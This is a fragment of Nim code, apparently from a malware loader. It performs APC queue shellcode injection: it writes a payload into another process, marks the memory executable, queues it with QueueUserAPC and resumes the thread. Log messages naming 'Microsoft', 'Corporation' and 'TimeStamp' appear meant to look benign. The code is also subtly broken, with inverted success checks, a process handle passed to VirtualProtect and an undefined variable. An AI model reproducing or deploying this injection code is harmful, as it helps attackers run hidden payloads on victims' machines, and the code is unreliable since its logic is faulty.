...
proc newApcQueue[byte](shellcode: openArray[byte]): void =
  ...
  status = WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten);
  if status == 0:
      echo "[*] Microsoft wrote decoded payload to allocated memory successfully."
  else:
      echo fmt"[!] Microsoft FAILED to write decoded payload to allocated memory: {res}"

  var oldprotect: DWORD = 0;
  status = VirtualProtect(pHandle, &ds, len(shellcode), PAGE_EXECUTE_READ, &oldprotect)
  if status == 0:
    echo "[*] Operations modified permissions successfully."
  else:
    echo fmt"Operations FAILED to modify permissions: {res}"
  
  status = QueueUserAPC(tHandle, cast[PKNORMAL_ROUTINE](ds), ds, NULL, NULL)
  if status == 0:
    echo "[*] Corporation added routine to APC queue successfully."
  else:
    echo fmt"[!] Corporation FAILED to add routine to APC queue: {res}"

  status = ResumeThread(tHandle)
  if status == 0:
    echo "[*] TimeStamp resumed thread successfully."
  else:
    echo fmt"[!] TimeStamp FAILED to resume thread:  {res}"
